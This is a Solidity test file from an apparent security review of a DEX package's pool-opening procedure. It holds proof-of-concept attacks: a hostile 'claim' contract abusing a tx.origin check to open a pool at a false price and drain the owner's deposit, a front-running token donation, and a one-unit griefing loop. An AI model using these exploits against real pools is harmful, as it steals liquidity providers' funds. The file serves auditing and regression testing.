// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Review r17 (agent 328): the opening of a pool in the multichain package at 0566af3, attacked.
// The package's plan: factory.firstDepositor = the owner's depositing account, no pair at deployment, the first
// deposit through the router with minimums equal to the amounts (scripts/multichain/first-deposit.mjs `prepare`),
// later deposits at the pool's own price with minimums 0.5% below (`add`).
// The token has 18 decimals; the market price is 1 native = 3,000.
import {TestBase, TestToken} from "../TestBase.sol";
import {WBLCH} from "../../contracts/assets/WBLCH.sol";
import {UniswapV2Factory} from "../../contracts/UniswapV2Factory.sol";
import {UniswapV2Pair} from "../../contracts/UniswapV2Pair.sol";
import {BDexRouter} from "../../contracts/periphery/BDexRouter.sol";

interface OriginVm328 {
    function startPrank(address sender, address origin) external;
}

/// Anything the depositing account calls: a "claim" page, a token with a hook, a router of another site.
/// It was funded with dust by the attacker beforehand. Inside the owner's transaction tx.origin is the owner.
contract HostileClaim {
    address immutable attacker;
    UniswapV2Factory immutable factory;
    WBLCH immutable wrapped;
    TestToken immutable usdc;

    constructor(UniswapV2Factory _factory, WBLCH _wrapped, TestToken _usdc) {
        attacker = msg.sender;
        factory = _factory;
        wrapped = _wrapped;
        usdc = _usdc;
    }

    receive() external payable {}

    /// What the owner believes: a harmless call. What it does: opens the owner's planned pool at 1 native = 2.
    function claim() external {
        address pair = factory.getPair(address(wrapped), address(usdc));
        if (pair == address(0)) pair = factory.createPair(address(wrapped), address(usdc));
        wrapped.deposit{value: 1e12}();
        wrapped.transfer(pair, 1e12);
        usdc.transfer(pair, 2e12);
        UniswapV2Pair(pair).mint(attacker);
    }
}

contract R328FirstDepositTest is TestBase {
    OriginVm328 constant ovm = OriginVm328(address(uint160(uint256(keccak256("hevm cheat code")))));
    address constant FEE_TO = 0x775a993F09Bd80aeCF8F8c2ADe0C84158E3a0544;
    address constant OWNER = address(0xA11CE);
    address constant ATTACKER = address(0xBAD);
    uint256 constant NATIVE = 10 ether;
    uint256 constant TOKEN = 30_000 ether;

    WBLCH wrapped;
    TestToken usdc;
    UniswapV2Factory factory;
    BDexRouter router;

    function setUp() public {
        wrapped = new WBLCH();
        usdc = new TestToken();
        vm.deal(OWNER, 100 ether);
        vm.deal(ATTACKER, 100 ether);
        usdc.mint(OWNER, 100_000 ether);
        usdc.mint(ATTACKER, 100_000 ether);
        factory = new UniswapV2Factory(FEE_TO, OWNER, new address[](0), new uint256[](0));
        router = new BDexRouter(address(factory), address(wrapped));
    }

    function _pair() private view returns (UniswapV2Pair) {
        return UniswapV2Pair(factory.getPair(address(wrapped), address(usdc)));
    }

    function _reserves() private view returns (uint256 rNative, uint256 rToken) {
        UniswapV2Pair pair = _pair();
        (uint112 r0, uint112 r1,) = pair.getReserves();
        (rNative, rToken) = pair.token0() == address(wrapped) ? (uint256(r0), uint256(r1)) : (uint256(r1), uint256(r0));
    }

    /// first-deposit.mjs `prepare`: approve exactly the amount, addLiquidityBLCH with minimums = amounts.
    function _ownerPrepareDeposit() private {
        ovm.startPrank(OWNER, OWNER);
        usdc.approve(address(router), TOKEN);
        router.addLiquidityBLCH{value: NATIVE}(address(usdc), TOKEN, TOKEN, NATIVE, OWNER, block.timestamp);
        vm.stopPrank();
    }

    /// first-deposit.mjs `add` (addTransactions): the token amount at the pool's price, minimums 0.5% below.
    function _ownerAddDeposit(uint256 native) private returns (uint256 tokenAmount) {
        (uint256 rNative, uint256 rToken) = _reserves();
        tokenAmount = native * rToken / rNative;
        ovm.startPrank(OWNER, OWNER);
        usdc.approve(address(router), tokenAmount);
        router.addLiquidityBLCH{value: native}(
            address(usdc), tokenAmount, tokenAmount * 9950 / 10_000, native * 9950 / 10_000, OWNER, block.timestamp
        );
        vm.stopPrank();
    }

    function _attackerSells(uint256 tokenIn) private returns (uint256 nativeOut) {
        address[] memory path = new address[](2);
        path[0] = address(usdc);
        path[1] = address(wrapped);
        uint256 before = ATTACKER.balance;
        ovm.startPrank(ATTACKER, ATTACKER);
        usdc.approve(address(router), tokenIn);
        router.swapExactTokensForBLCH(tokenIn, 0, path, ATTACKER, block.timestamp);
        vm.stopPrank();
        nativeOut = ATTACKER.balance - before;
    }

    // ------------------------------------------------------------------ R309-MC-1, the original scenario

    /// The first-pass scenario, unchanged: after the deployment and before the owner's deposit a stranger tries to
    /// open the pool with dust at 1 native = 2. Against the package's plan every form reverts, the owner's deposit
    /// as printed opens the pool, and 600 buys what 600 is worth. FIXED.
    function test_R309_MC_1_originalScenario_isClosed() public {
        ovm.startPrank(ATTACKER, ATTACKER);
        UniswapV2Pair pair = UniswapV2Pair(factory.createPair(address(wrapped), address(usdc)));
        wrapped.deposit{value: 1e12}();
        wrapped.transfer(address(pair), 1e12);
        usdc.transfer(address(pair), 2e12);
        vm.expectRevert(bytes("BDEX: FIRST_DEPOSITOR"));
        pair.mint(ATTACKER);
        vm.expectRevert(bytes("BDEX: FIRST_DEPOSITOR"));
        pair.mint(OWNER);
        usdc.approve(address(router), 2e12);
        vm.expectRevert(bytes("BDEX: FIRST_DEPOSITOR"));
        router.addLiquidityBLCH{value: 1e12}(address(usdc), 2e12, 0, 0, ATTACKER, block.timestamp);
        vm.expectRevert(bytes("BDEX: EMPTY_POOL"));
        pair.sync();
        vm.stopPrank();
        _ownerPrepareDeposit();
        uint256 taken = _attackerSells(600 ether);
        assertTrue(taken < 0.2 ether);
    }

    // ------------------------------------------------------------------ R328-1: the origin rule and `add`

    /// R328-1. The pair accepts a first mint whose ORIGIN is the first depositor. One transaction of the depositing
    /// account to any contract the attacker controls opens the owner's planned pool at the attacker's price; the
    /// gate then reports the pair "open" (which the package reads as "opened by the owner"), `prepare` answers
    /// "use `add` for a pool that is already open", and `add` deposits at the pool's price: 10 native against 20
    /// tokens. The attacker buys the native side for 600: the loss of R309-MC-1, through the package's own tool.
    function test_R328_1_originOfTheDepositorOpensThePool_thenAddDepositsAtTheFalsePrice() public {
        ovm.startPrank(ATTACKER, ATTACKER);
        HostileClaim hostile = new HostileClaim(factory, wrapped, usdc);
        payable(address(hostile)).transfer(1e12);
        usdc.transfer(address(hostile), 2e12);
        vm.stopPrank();

        // The owner's account calls it once (the pair does not exist yet: the hostile call creates it too).
        ovm.startPrank(OWNER, OWNER);
        hostile.claim();
        vm.stopPrank();
        UniswapV2Pair pair = _pair();
        assertTrue(pair.totalSupply() > 0); // the gate's state: "open"
        (uint256 rNative, uint256 rToken) = _reserves();
        assertEq(rNative, 1e12);
        assertEq(rToken, 2e12); // 1 native = 2

        // `prepare` (strict minimums) would revert: that protection holds.
        ovm.startPrank(OWNER, OWNER);
        usdc.approve(address(router), TOKEN);
        vm.expectRevert(bytes("BDEX: INSUFFICIENT_A_AMOUNT"));
        router.addLiquidityBLCH{value: NATIVE}(address(usdc), TOKEN, TOKEN, NATIVE, OWNER, block.timestamp);
        vm.stopPrank();

        // The tool's own advice for an open pool: `add --native 10`.
        uint256 paired = _ownerAddDeposit(NATIVE);
        assertEq(paired, 20 ether); // 10 native were paired with 20 tokens instead of 30,000

        uint256 taken = _attackerSells(600 ether);
        assertTrue(taken > 9.6 ether); // more than 9.6 of the owner's 10 native for 600
    }

    // ------------------------------------------------------------------ R328-2: a donation in front of the deposit

    /// R328-2. The document says of the printed deposit: "the pool opens with exactly the two amounts as its
    /// reserves, or not at all". Not so: tokens sent to the pair after `prepare` read it and before the deposit is
    /// mined join the opening pool, minimums equal to the amounts do not see them, and the pool opens at another
    /// price. Here 300 tokens (1% of one side): `verify` (0.1%) then fails, and the document's remedy (withdraw)
    /// leaves a pool that is open for ever at that price with 1,000 locked share units, which `prepare` refuses.
    /// The donor loses the donation; the owner loses nothing. The defect is the claim and the dead end.
    function test_R328_2_donationBetweenPrepareAndDeposit_opensThePoolAtAnotherPrice() public {
        // prepare saw: pair absent, nothing at its address. Then, in front of the owner's deposit:
        ovm.startPrank(ATTACKER, ATTACKER);
        UniswapV2Pair pair = UniswapV2Pair(factory.createPair(address(wrapped), address(usdc)));
        usdc.transfer(address(pair), 300 ether);
        vm.stopPrank();
        _ownerPrepareDeposit(); // does not revert
        (uint256 rNative, uint256 rToken) = _reserves();
        assertEq(rNative, NATIVE);
        assertEq(rToken, TOKEN + 300 ether); // not "exactly the two amounts"
        // verify: at most 0.1% above the deposited amount -> FAIL.
        assertTrue((rToken - TOKEN) * 10_000 > TOKEN * 10);

        // The document's remedy: the depositor withdraws through the router.
        uint256 shares = pair.balanceOf(OWNER);
        uint256 nativeBefore = OWNER.balance;
        uint256 tokenBefore = usdc.balanceOf(OWNER);
        ovm.startPrank(OWNER, OWNER);
        pair.approve(address(router), shares);
        router.removeLiquidityBLCH(address(usdc), shares, 0, 0, OWNER, block.timestamp);
        vm.stopPrank();
        // The owner got the deposit back and the donation with it (less the locked dust).
        assertTrue(usdc.balanceOf(OWNER) - tokenBefore > TOKEN + 299 ether);
        assertTrue(OWNER.balance - nativeBefore > NATIVE - 1e9);
        // But the pool is not empty again and never will be: `prepare` ("the pool is not open yet") now fails for
        // ever, and a strict first deposit reverts.
        assertEq(pair.totalSupply(), 1000);
        ovm.startPrank(OWNER, OWNER);
        usdc.approve(address(router), TOKEN);
        vm.expectRevert(bytes("BDEX: INSUFFICIENT_A_AMOUNT"));
        router.addLiquidityBLCH{value: NATIVE}(address(usdc), TOKEN, TOKEN, NATIVE, OWNER, block.timestamp);
        vm.stopPrank();
    }

    /// The same donation is never a profit for the donor, at any size tried: after opening, the donor (or anyone)
    /// can only buy back less than was given. Checked for 1%, 10% and 100% of one side.
    function test_donationIsAlwaysALossForTheDonor() public {
        uint256[3] memory gifts = [uint256(300 ether), 3_000 ether, 30_000 ether];
        for (uint256 i; i < gifts.length; ++i) {
            setUp();
            ovm.startPrank(ATTACKER, ATTACKER);
            UniswapV2Pair pair = UniswapV2Pair(factory.createPair(address(wrapped), address(usdc)));
            usdc.transfer(address(pair), gifts[i]);
            vm.stopPrank();
            _ownerPrepareDeposit();
            // The pool now overpays for native: the donor sells native until the price is 3,000 again.
            (uint256 rNative, uint256 rToken) = _reserves();
            uint256 targetNative = _sqrt(rNative * rToken / 3000);
            uint256 nativeIn = (targetNative - rNative) * 1000 / 997;
            address[] memory path = new address[](2);
            path[0] = address(wrapped);
            path[1] = address(usdc);
            uint256 before = usdc.balanceOf(ATTACKER);
            ovm.startPrank(ATTACKER, ATTACKER);
            router.swapExactBLCHForTokens{value: nativeIn}(0, path, ATTACKER, block.timestamp);
            vm.stopPrank();
            uint256 got = usdc.balanceOf(ATTACKER) - before;
            // What the donor recovered above the market worth of the native sold, against the gift.
            uint256 profit = got > nativeIn * 3000 ? got - nativeIn * 3000 : 0;
            assertTrue(profit < gifts[i] / 2);
        }
    }

    // ------------------------------------------------------------------ R328-3: one unit keeps `prepare` failing

    /// R328-3. `prepare` refuses while ANY token unit sits at the pair's address and tells the owner to skim.
    /// One base unit (a millionth of a cent of USDC) sent again after each skim keeps the documented path failing
    /// for as long as the sender likes, at the price of a transfer; the pair accepts the deposit all the same and
    /// `verify` tolerates 0.1%.
    function test_R328_3_oneUnitAtThePairAddress_blocksPrepare_notTheDeposit() public {
        ovm.startPrank(ATTACKER, ATTACKER);
        UniswapV2Pair pair = UniswapV2Pair(factory.createPair(address(wrapped), address(usdc)));
        for (uint256 round; round < 3; ++round) {
            usdc.transfer(address(pair), 1);
            assertEq(usdc.balanceOf(address(pair)), 1); // prepare: FAIL "no tokens sit at the pair's address"
            pair.skim(OWNER); // the printed remedy
            assertEq(usdc.balanceOf(address(pair)), 0);
        }
        usdc.transfer(address(pair), 1);
        vm.stopPrank();
        _ownerPrepareDeposit(); // the deposit itself is unaffected
        (uint256 rNative, uint256 rToken) = _reserves();
        assertEq(rNative, NATIVE);
        assertEq(rToken, TOKEN + 1);
    }

    function _sqrt(uint256 y) private pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}
